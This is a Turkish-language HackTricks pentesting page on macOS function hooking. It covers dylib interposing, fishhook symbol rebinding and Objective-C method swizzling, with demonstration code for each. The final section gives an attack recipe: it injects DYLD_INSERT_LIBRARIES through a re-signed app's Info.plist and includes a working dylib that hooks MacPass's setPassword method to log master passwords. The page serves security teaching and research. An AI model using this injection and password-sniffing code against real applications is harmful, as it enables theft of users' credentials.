# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**Orijinal** ve **replacement** işlevlere başvuran **function pointers** demetlerini içeren bir **dylib** oluşturun. Bu demetler, **`__interpose` (`__DATA___interpose`)** bölümü (veya **`S_INTERPOSING`** ile işaretlenmiş bir bölüm) içinde bulunmalıdır.

Ardından **`DYLD_INSERT_LIBRARIES`** ile dylib'i **inject** edin (interposing işlemlerinin ana uygulama yüklenmeden önce gerçekleşmesi gerekir). Açıkçası, [**`DYLD_INSERT_LIBRARIES`** kullanımına uygulanan **kısıtlamalar** burada da geçerlidir](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> **`DYLD_PRINT_INTERPOSING`** env variable'ı interposing işlemini debug etmek için kullanılabilir ve interpose sürecini yazdırır.

Ayrıca **interposing işleminin process ile yüklenen library'ler arasında gerçekleştiğini** unutmayın; shared library cache ile çalışmaz.

### Dynamic Interposing

Artık **`dyld_dynamic_interpose`** function'ını kullanarak bir function'ı dinamik olarak interpose etmek de mümkündür. Bu, bir function'ı yalnızca **başlangıçta** değil, **runtime** sırasında programatik olarak interpose etmenizi sağlar.

Yalnızca **değiştirilecek function ile replacement function'ının **tuple**'larını belirtmek gerekir.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Zaten **process içinde** kod çalıştırabiliyorsanız ve hedefi yeniden başlatmadan **import edilmiş bir C function** hook'lamak istiyorsanız, çok yaygın bir primitive **symbol rebinding**'dir (**`fishhook`** tarafından popüler hâle getirilmiştir).

**`__interpose`** section'ını kullanmak yerine bu teknik, Mach-O metadata'sını (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) tarar ve mevcut image tarafından kullanılan import slot'unu **overwrites** eder. Bu, **already-running** bir process içindeki function'ları hook'lamak veya **`rebind_symbols_image`** ile **yalnızca tek bir image**'ı hook'lamak için oldukça kullanışlıdır.<sup>[[2]](#references)</sup>

> [!TIP]
> Bu yalnızca gerçekten bir **import pointer** üzerinden gerçekleşen çağrıları etkiler. Target function aynı image içinde **doğrudan** çağrılıyorsa yeniden yazılacak bir imported slot yoktur; dolayısıyla bu teknik o call site'ını göremez.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Son macOS sürümlerinde birçok rebinding hedefi artık yazılabilir **`__DATA`** sayfalarında bulunmuyor. Rebinder'lar pointer'ı patch'lemeden önce genellikle **`__DATA_CONST`** bölümünü geçici olarak yazılabilir hâle getirmelidir. Ayrıca Apple Silicon / **`arm64e`** üzerinde authenticated pointer'lar ve **`__AUTH_CONST.__auth_got`** içinde ek indirection beklemelisiniz; yalnızca klasik lazy/non-lazy symbol pointer bölümlerini tarayan bir rebinder bazı call site'ları kaçırabilir.<sup>[[3]](#references)</sup>

> [!CAUTION]
> **`arm64e`** ABI'si birçok function pointer için **Pointer Authentication (PAC)** kullanır. Intel üzerinde çalışan blind pointer write işlemleri Apple Silicon'da bir call site'ı bozabilir. Kendi rebinder'ınızı veya inline hooker'ınızı yazarken **`<ptrauth.h>`** içindeki **`ptrauth_sign_unauthenticated`** veya **`ptrauth_auth_and_resign`** gibi helper'ları kullanmaya ve özellikle **`arm64e`** hedeflerinde test etmeye hazır olun.

**`__AUTH`**, **`__AUTH_CONST`** ve **`__auth_got`** hakkında daha fazla bilgi için [bu sayfaya](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md) bakın.

## Method Swizzling

ObjectiveC'de bir method şu şekilde çağrılır: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**object**, **method** ve **params** gerekir. Bir method çağrıldığında **`objc_msgSend`** function'ı kullanılarak bir **msg gönderilir**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object **`someObject`**, method **`@selector(method1p1:p2:)`** ve argument'lar **value1**, **value2**'dir.

Object structure'larını takip ederek, **name**'lerin ve method code'una ait **pointer**'ların **bulunduğu** bir **method array**'ine ulaşmak mümkündür.

> [!CAUTION]
> Method'lara ve class'lara name'leri temel alınarak erişildiğine dikkat edin; bu bilgiler binary içinde saklanır. Bu nedenle `otool -ov </path/bin>` veya [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ile alınabilir.

### Accessing the raw methods

Aşağıdaki örnekte olduğu gibi method'ların name, param sayısı veya address gibi bilgilerine erişmek mümkündür:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### method_exchangeImplementations ile Method Swizzling

**`method_exchangeImplementations`** fonksiyonu, **bir fonksiyonun implementation'ının** **adresini diğerinin adresiyle değiştirmeye** olanak tanır.

> [!CAUTION]
> Bu nedenle bir fonksiyon çağrıldığında **gerçekte çalıştırılan diğeridir**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Bu durumda **legit** yöntemin **implementation code**'u **method** **name**'ini **verify** ederse bu swizzling'i **detect** edebilir ve çalışmasını engelleyebilir.
>
> Aşağıdaki teknik bu kısıtlamaya sahip değildir.

### method_setImplementation ile Method Swizzling

Önceki format gariptir, çünkü 2 method'un implementation'ını birbirlerininkiyle değiştiriyorsunuz. **`method_setImplementation`** işlevini kullanarak bir **method**'un **implementation**'ını diğerininkiyle **change** edebilirsiniz.

Yeni implementation'dan çağıracaksanız, üzerine yazmadan önce orijinal implementation'ın adresini **store** etmeyi unutmayın; çünkü daha sonra bu adresi bulmak çok daha karmaşık olacaktır.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Bu sayfada functions hook etmenin farklı yolları ele alındı. Ancak bunlar, **saldırılacak process'in içinde code çalıştırılmasını** gerektiriyordu.

Bunu gerçekleştirmek için kullanılabilecek en kolay technique, [environment variables veya hijacking aracılığıyla bir Dyld inject etmektir](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Ancak bunun [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) aracılığıyla da yapılabileceğini düşünüyorum.

Bununla birlikte, her iki seçenek de **korumasız** binary/process'lerle **sınırlıdır**. Sınırlamalar hakkında daha fazla bilgi edinmek için her technique'i inceleyin.

Ancak bir function hooking attack oldukça özeldir; attacker bunu **bir process'in içinden hassas bilgileri çalmak** için gerçekleştirir (aksi takdirde yalnızca bir process injection attack yapardınız). Bu hassas bilgiler, MacPass gibi user tarafından indirilen App'lerde bulunabilir.

Bu nedenle attacker vector, ya bir vulnerability bulmak ya da application'ın signature'ını kaldırmak, ardından aşağıdakine benzer bir şey ekleyerek application'ın Info.plist'i üzerinden **`DYLD_INSERT_LIBRARIES`** env variable'ını inject etmek olacaktır:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
ve ardından uygulamayı **yeniden kaydedin**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Bu kütüphaneye bilgileri exfiltrate etmek için hooking kodunu ekleyin: Parolalar, mesajlar...

> [!CAUTION]
> macOS'un daha yeni sürümlerinde uygulama binary'sinin **signature'ını kaldırırsanız** ve uygulama daha önce çalıştırılmışsa macOS'un **uygulamayı artık çalıştırmayacağını** unutmayın.

#### Kütüphane örneği
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referanslar

- [1] [Method Swizzling - NSHipster](https://nshipster.com/method-swizzling/)
- [2] [facebook/fishhook: Mach-O binary dosyalarında sembolleri dinamik olarak yeniden bağlama sürecini kolaylaştıran bir library](https://github.com/facebook/fishhook)
- [3] [Pointer Authentication - Clang Documentation](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
